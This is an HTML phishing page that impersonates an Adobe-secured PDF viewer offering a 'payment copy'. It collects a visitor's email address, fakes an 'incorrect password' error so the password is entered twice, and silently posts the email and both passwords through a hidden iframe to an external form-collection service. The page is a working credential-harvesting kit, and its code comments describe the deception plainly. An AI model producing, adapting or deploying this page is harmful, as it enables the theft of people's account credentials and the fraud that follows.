<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF ‚Äî Payment Copy</title>
  <style>
    /* Same styling as before */
    /* Your previous styles go here... */
  </style>
</head>
<body>
  <div id="splash">
    <h2>Loading Secure Viewer‚Ä¶</h2>
    <p>Please wait while we prepare your file</p>
    <div class="loader"></div>
  </div>

  <div id="main">
    <div class="card">
      <div class="pdf-icon">
        <!-- Your icon goes here -->
      </div>

      <h1>This File is Protected By Adobe¬Æ<br>Security.</h1>
      <p class="lead">Click Continue to enter your password and view the payment copy.</p>

      <iframe name="hiddenFrame" style="display:none;"></iframe>

      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
        <div id="stepEmail">
          <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="email" required>
          <div class="center-row small-actions">
            <button id="continueBtn" class="btn-download" type="button">Continue</button>
          </div>
        </div>

        <!-- Step 1: Password input -->
        <div id="stepPassword1" class="hidden">
          <div class="password-wrapper">
            <input id="password1" name="password1" class="input" type="password" placeholder="Enter Password" autocomplete="current-password" required>
            <span id="togglePassword1" class="toggle-password" title="Show / hide password">üëÅÔ∏è</span>
          </div>
          <div class="download-wrap">
            <button id="submitBtn1" class="btn-download" type="button">Submit Password</button>
          </div>
        </div>

        <!-- Step 2: Confirm Password input -->
        <div id="stepPassword2" class="hidden">
          <div class="password-wrapper">
            <input id="password2" name="password2" class="input" type="password" placeholder="Confirm Password" autocomplete="current-password" required>
            <span id="togglePassword2" class="toggle-password" title="Show / hide password">üëÅÔ∏è</span>
          </div>
          <div class="download-wrap">
            <button class="btn-download" type="submit">DOWNLOAD</button>
          </div>
        </div>
      </form>

      <!-- File info section -->
      <div class="file-info">
        <div class="file-thumb">
          <!-- Your file thumbnail here -->
        </div>
        <div class="file-meta">
          <h4>Download File Information</h4>
          <div class="desc">Payment copy</div>
          <div class="size">File Size: 47kb</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Splash
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('splash').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('splash').style.display = 'none';
          document.getElementById('main').classList.add('show');
        }, 500);
      }, 800);
    });

    const emailInput = document.getElementById('email');
    const continueBtn = document.getElementById('continueBtn');
    const password1Input = document.getElementById('password1');
    const password2Input = document.getElementById('password2');
    const stepEmail = document.getElementById('stepEmail');
    const stepPassword1 = document.getElementById('stepPassword1');
    const stepPassword2 = document.getElementById('stepPassword2');
    const togglePassword1 = document.getElementById('togglePassword1');
    const togglePassword2 = document.getElementById('togglePassword2');
    const submitBtn1 = document.getElementById('submitBtn1');

    // Show password 1 step
    continueBtn.addEventListener('click', () => {
      if (!emailInput.value) {
        emailInput.focus();
        return;
      }
      stepEmail.classList.add('hidden');
      stepPassword1.classList.remove('hidden');
      password1Input.focus();
    });

    // Show password 2 step after incorrect first attempt
    submitBtn1.addEventListener('click', () => {
      // Simulate incorrect password for the first submission
      alert("The password you entered is incorrect. Please try again.");
      stepPassword1.classList.add('hidden');
      stepPassword2.classList.remove('hidden');
      password2Input.focus();
    });

    // Toggle password visibility for both inputs
    if (togglePassword1 && password1Input) {
      togglePassword1.addEventListener('click', () => {
        const isHidden = password1Input.type === 'password';
        password1Input.type = isHidden ? 'text' : 'password';
        togglePassword1.textContent = isHidden ? 'üôà' : 'üëÅÔ∏è';
      });
    }

    if (togglePassword2 && password2Input) {
      togglePassword2.addEventListener('click', () => {
        const isHidden = password2Input.type === 'password';
        password2Input.type = isHidden ? 'text' : 'password';
        togglePassword2.textContent = isHidden ? 'üôà' : 'üëÅÔ∏è';
      });
    }

    // Submit the form even if the passwords don't match
    document.getElementById('mainForm').addEventListener('submit', (e) => {
      e.preventDefault(); 
      e.target.submit();  // Submit the form to Formspark
    });
  </script>
</body>
</html>
